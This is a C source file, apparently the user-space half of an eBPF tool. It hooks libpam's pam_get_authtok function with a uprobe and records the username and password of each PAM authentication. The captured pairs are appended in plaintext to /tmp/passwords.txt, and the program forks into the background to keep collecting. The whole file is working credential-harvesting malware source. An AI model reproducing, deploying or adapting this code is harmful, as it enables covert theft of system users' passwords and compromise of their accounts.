#include <stdio.h>
#include <unistd.h>
#include <setjmp.h>
#include <gelf.h>
#include <string.h>
#include <stdlib.h>
#include <linux/limits.h>
#include <bpf/libbpf.h>
#include "spit.skel.h"

FILE *out_file;

struct event {
	int pid;
	char username[512];
	char password[512];
};

int get_symbol_address(const char *path, const char *symbol_name)
{
	FILE *file = fopen(path, "rb");
	if (file == NULL) {
		fprintf(stderr, "Failed to open file");
		exit(1);
	}
	Elf *e = NULL;
	int result = -1;
	if (elf_version(EV_CURRENT) == EV_NONE) {
		fprintf(stderr, "Failed to get elf version");
		exit(1);
	}
	e = elf_begin(fileno(file), ELF_C_READ, NULL);
	if (e == NULL) {
		fprintf(stderr, "Failed elf_begin");
		exit(1);
	}
	Elf_Scn *section = NULL;
	// loop over each section
	while ((section = elf_nextscn(e, section)) != 0) {
		GElf_Shdr header;
		// get section header
		if (!gelf_getshdr(section, &header))
			continue;
		// check section header type
		if (header.sh_type != SHT_SYMTAB && header.sh_type != SHT_DYNSYM)
			continue;
		Elf_Data *data = NULL;
		// if we get a section that could have function symbols loop over the symbols
		while ((data = elf_getdata(section, data)) != 0) {
			size_t i, symbol_count = data->d_size / header.sh_entsize;
			// get section iterator symbol count and
			if (data->d_size % header.sh_entsize)
				break;
			for (i = 0; i < symbol_count; i++) {
				GElf_Sym symbol;
				const char *name;
				if (!gelf_getsym(data, (int)i, &symbol))
					continue;
				if ((name = elf_strptr(e, header.sh_link, symbol.st_name)) == NULL)
					continue;
				if (strcmp(name, symbol_name) == 0) {
					result = symbol.st_value;
					break;
				}
			}
		}
	}
	elf_end(e);
	return result;
}

static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
{
	return vfprintf(stderr, format, args);
}

static int buffer_process_data(void *ctx, void *data, size_t len)
{
	struct event *evt = (struct event *)data;
	//printf("%d %s %s\n", evt->pid, evt->username, evt->password);
	size_t count = snprintf(NULL, 0, "\n%d %s %s\n\0", evt->pid, evt->username, evt->password);
	char *buffer = malloc(count + 1);
	snprintf(buffer, count, "\n%d %s %s\n\0", evt->pid, evt->username, evt->password);
	//printf("count %d str %s\n", count, buffer);
	fwrite(buffer, 1, count, out_file);
	fflush(out_file);
	free(buffer);
	return 0;
}

int main(int argc, char **argv)
{
	out_file = fopen("/tmp/passwords.txt", "a");
	struct spit_bpf *skel;
	int err;

	/* Set up libbpf errors and debug info callback */
	libbpf_set_print(libbpf_print_fn);

	/* Open BPF application */
	skel = spit_bpf__open();
	if (!skel) {
		fprintf(stderr, "Failed to open BPF skeleton\n");
		return 1;
	}

	/* ensure BPF program only handles write() syscalls from our process */
	skel->bss->my_pid = getpid();

	/* Load & verify BPF programs */
	err = spit_bpf__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}
	// init ring buffer
	struct ring_buffer *rb = NULL;
	rb = ring_buffer__new(bpf_map__fd(skel->maps.kernel_ring_buffer), buffer_process_data, NULL,
			      NULL);
	if (!rb) {
		goto cleanup;
	}

	/*
	 * Manually attach to libc.so we find.
	 * We specify pid here, so we don't have to do pid filtering in BPF program.
	 */

	/* Attach tracepoint handler */
	err = spit_bpf__attach(skel);
	if (err) {
		fprintf(stderr, "Failed to attach BPF skeleton\n");
		goto cleanup;
	}
	int offset = -1;
	// depends on distro should be passed as an arg
	//const char *path = "/lib/x86_64-linux-gnu/libpam.so.0";
	const char *path = "/usr/lib64/libpam.so.0.85.1";
	offset = get_symbol_address(path, "pam_get_authtok");
	if (offset == -1) {
		fprintf(stderr, "Failed to get offset\n");
		goto cleanup;
	}
	skel->links.uprobe_pam_get_authtok = bpf_program__attach_uprobe(
		skel->progs.uprobe_pam_get_authtok, true, -1, path, offset);
	if (!skel->links.uprobe_pam_get_authtok) {
		err = -errno;
		fprintf(stderr, "Failed to attach uprobe %d\n", err);
		goto cleanup;
	}
	printf("Successfully started! Please run `sudo cat /sys/kernel/debug/tracing/trace_pipe` "
	       "to see output of the BPF programs.\n");
	pid_t p;
	p = fork();
	if (p != 0)
		exit(0);
	for (;;) {
		ring_buffer__poll(rb, 1000);
	}

cleanup:
	spit_bpf__destroy(skel);
	fclose(out_file);
	return -err;
}
